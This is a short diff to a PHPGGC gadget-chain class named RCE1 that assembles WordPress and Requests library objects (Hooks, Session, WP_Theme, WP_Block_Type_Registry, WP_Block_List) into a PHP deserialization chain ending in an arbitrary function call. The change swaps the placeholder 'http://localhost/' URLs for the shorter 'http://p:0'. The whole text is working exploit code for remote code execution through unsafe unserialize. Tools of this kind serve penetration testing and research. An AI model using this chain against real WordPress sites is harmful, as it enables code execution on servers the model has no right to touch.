@@ -22,7 +22,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 
         $hooks_recurse_once = new \WpOrg\Requests\Hooks(
             array(
-                'http://localhost/Name' => array(
+                'http://p:0/Name' => array(
                     array($function)
                 )
             )
@@ -41,7 +41,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
             )
         );
 
-        $parent = new \WpOrg\Requests\Session('http://localhost/', array($parameter), array('hooks' => $hooks));
+        $parent = new \WpOrg\Requests\Session('http://p:0', array($parameter), array('hooks' => $hooks));
         $registered_block_types = new \WP_Theme(null, $parent);
         $registry = new \WP_Block_Type_Registry($registered_block_types);
         $headers = new \WP_Block_List($blocks, $registry);
